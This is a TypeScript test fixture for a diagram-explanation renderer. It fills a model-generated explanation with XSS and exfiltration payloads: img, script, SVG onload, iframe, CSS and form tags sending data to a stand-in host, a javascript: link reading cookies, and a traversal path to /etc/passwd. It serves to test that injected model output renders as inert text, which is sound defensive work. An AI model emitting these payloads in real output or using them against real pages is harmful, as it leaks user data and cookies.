import type { Explanation } from "@diagram-mapper/explain/contract";

/**
 * A worst-case explanation: every free-text field carries a payload that would exfiltrate
 * or execute if any part of the renderer treated model output as markup or as a URL. The
 * resource names in the payload URLs mirror eval/fixtures/tf-injection, so a leak would carry
 * real-looking tenant data. `exfil.invalid` is a reserved TLD and never resolves.
 */
const EXFIL = "https://exfil.invalid/p?d=aws_iam_role.admin,aws_s3_bucket.logs";
const COMMIT = "3bfcc34a1d0e";

export const PAYLOADS = {
  img: `<img src="${EXFIL}&via=img">`,
  markdownImage: `![status](${EXFIL}&via=md-img)`,
  script: `<script>fetch("${EXFIL}&via=script")</script>`,
  jsLink: "[open console](javascript:alert(document.cookie))",
  autolink: `${EXFIL}&via=autolink`,
  svg: `<svg onload="fetch('${EXFIL}&via=svg')"></svg>`,
  style: `<style>body{background:url("${EXFIL}&via=css")}</style>`,
  iframe: `<iframe src="${EXFIL}&via=iframe"></iframe>`,
  form: `<form action="${EXFIL}&via=form"><button>Continue</button></form>`,
} as const;

const cite = (file: string, startLine = 1, endLine = startLine) => ({
  file,
  startLine,
  endLine,
  commitSha: COMMIT,
  snippetSha256: "0".repeat(64),
});

export const INJECTION_EXPLANATION: Explanation = {
  schemaVersion: "1.0",
  questionId: "e2e-injection",
  nodeAddress: "aws_s3_bucket.logs",
  answerPath: "narrated",
  narrative: [
    { type: "claim", claimId: "c1" },
    { type: "connective", text: PAYLOADS.svg },
    { type: "claim", claimId: "c2" },
    { type: "claim", claimId: "c3" },
    { type: "connective", text: PAYLOADS.iframe },
    { type: "claim", claimId: "c4" },
  ],
  claims: [
    {
      id: "c1",
      text: `The public access block sets block_public_acls to false. ${PAYLOADS.img}`,
      confidence: "verified",
      kind: "attribute",
      subjects: ["aws_s3_bucket_public_access_block.logs"],
      values: { block_public_acls: false },
      citations: [cite("main.tf", 14, 18)],
      source: "model",
    },
    {
      id: "c2",
      text: `${PAYLOADS.markdownImage} ${PAYLOADS.script} ${PAYLOADS.style}`,
      confidence: "inferred",
      kind: "purpose",
      subjects: ["aws_s3_bucket.logs"],
      citations: [
        cite("main.tf", 7, 11),
        // Hostile citation paths: each must render as inert text, never as a link.
        cite(`${EXFIL}&via=citation`),
        cite("javascript:alert(1)"),
        cite("//exfil.invalid/x"),
        cite("../../../etc/passwd"),
      ],
      source: "model",
    },
    {
      id: "c3",
      text: `${PAYLOADS.jsLink} ${PAYLOADS.autolink}`,
      confidence: "general-knowledge",
      kind: "provider-doc",
      subjects: [],
      citations: [],
      source: "model",
    },
    {
      id: "c4",
      text: PAYLOADS.form,
      confidence: "inferred",
      kind: "purpose",
      subjects: ["aws_iam_role.admin"],
      citations: [cite("main.tf", 26, 32)],
      source: "model",
    },
  ],
  unanswered: [{ reason: "not-in-repository", detail: PAYLOADS.img }],
  retrieval: {
    strategy: "e2e",
    nodeAddresses: ["aws_s3_bucket.logs"],
    edgeCount: 0,
    spans: [],
    sourceCharsSent: 0,
  },
  flags: [
    {
      code: "INJECTION_ATTEMPT_IN_SOURCE",
      severity: "warn",
      message: PAYLOADS.script,
      where: { file: "main.tf", startLine: 1, endLine: 5 },
    },
  ],
  usage: {
    model: null,
    inputTokens: 0,
    cachedInputTokens: 0,
    outputTokens: 0,
    costUsd: 0,
    costGbp: 0,
    measured: false,
  },
};
